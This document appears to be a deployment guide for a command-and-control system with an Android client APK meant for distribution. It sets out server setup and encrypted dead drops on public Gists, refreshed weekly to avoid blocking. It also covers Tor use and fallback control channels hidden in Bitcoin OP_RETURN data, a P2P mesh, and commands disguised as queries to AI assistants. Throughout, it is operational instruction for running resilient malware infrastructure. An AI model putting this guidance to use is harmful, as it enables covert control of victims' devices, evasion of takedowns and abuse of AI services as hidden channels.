# Deployment Guide

## Server Deployment (Render)

1. Push code to GitHub repository.
2. Create a new Web Service on Render, connect your repository.
3. Set the following environment variables (use `.env.example` as reference):
   - `MASTER_SECRET_B64` – Base64-encoded 32-byte master secret.
   - `SALT` – Random salt (minimum 16 bytes).
   - `ADMIN_ID` – Telegram user ID of the administrator.
   - `BOT_TOKENS` – Comma-separated Telegram bot tokens (10+ recommended).
   - `SUPABASE_URLS` – Comma-separated Supabase project URLs.
   - `SUPABASE_KEYS` – Comma-separated Supabase anon keys (matching URLs).
   - `DEAD_DROP_URLS` – Comma-separated encrypted Dead Drop URLs (GitHub Gists, Pastebin, etc.).
   - `GITHUB_RAW_URLS` – Comma-separated GitHub raw URLs for fallback.
   - `ACCESS_KEY` – Strong API access key.
   - `USE_TOR` – `true`/`false` (optional, default `false`).
   - `TOR_PROXY` – Tor proxy URL (if `USE_TOR` is `true`).
   - `USE_AI_C2` – `true`/`false` (enable AI‑based C2 channels).
   - `AI_C2_ENDPOINTS` – Comma-separated AI endpoints (e.g., Copilot, Grok).
   - `USE_BLOCKCHAIN` – `true`/`false` (enable Blockchain C2).
   - `USE_P2P` – `true`/`false` (enable P2P network).
   - `USE_MCP` – `true`/`false` (enable MCP channel).
4. Build command: `pip install -r server/requirements.txt`
5. Start command: `gunicorn server.shadow_service:app`
6. Note the public IP address (avoid using DNS).  
   **Important:** Use a static IP or update it dynamically via Dead Drops.

## Android Client Build

1. Open `client/android` in Android Studio.
2. The client reads `base_url` from SharedPreferences; you can either:
   - Hardcode the server IP in `Communicator.kt` (temporary), or
   - (Recommended) Update the IP dynamically through Dead Drops (see below).
3. Build signed APK (release mode).
4. Distribute APK via any channel.

## AI Modules (Optional)

Each module runs independently. See individual `README.md` files inside `modules/`.

### Shannon Lite
```bash
cd modules/shannon_lite
docker build -t shannon-lite .
docker run -p 8080:8080 shannon-lite
```

RedAmon

```bash
cd modules/redamon
pip install -r requirements.txt
python redamon.py <target_ip>
```

IntelliRadar

```bash
cd modules/intelliradar
pip install -r requirements.txt
python scanner.py
```

Dead Drops Setup

1. Create a GitHub Gist with the following content (encrypted):
   ```json
   {
     "endpoints": ["https://your-render-ip:10000", "https://backup-ip:10000"],
     "telegram": ["token1", "token2", "..."]
   }
   ```
2. Encrypt with AES‑256 using your master key.
3. Store the encrypted blob in a public Gist.
4. Add the raw Gist URL to DEAD_DROP_URLS.

Updating Dead Drops

Periodically (weekly) refresh the Gist with new endpoints to avoid blocking.

Alternative Control Channels (No External Accounts)

If all GitHub, Render, and Supabase accounts are blocked, the system automatically falls back to:

· Blockchain C2 – Commands hidden in Bitcoin OP_RETURN (requires USE_BLOCKCHAIN=true and a funded wallet).
· P2P Network – Devices form an encrypted peer‑to‑peer mesh (requires USE_P2P=true).
· MCP Channel – Commands disguised as AI tool queries (requires USE_MCP=true).

Configure these via the corresponding environment variables.

Troubleshooting

· Check logs on Render dashboard.
· Ensure firewall allows port 10000.
· Verify that the Android client has internet permission.
· For geo‑blocked regions, enable Tor or VPN.
· For blockchain C2, ensure web3 is installed and the node is reachable.
· For P2P, make sure devices can discover each other on the same local network.

```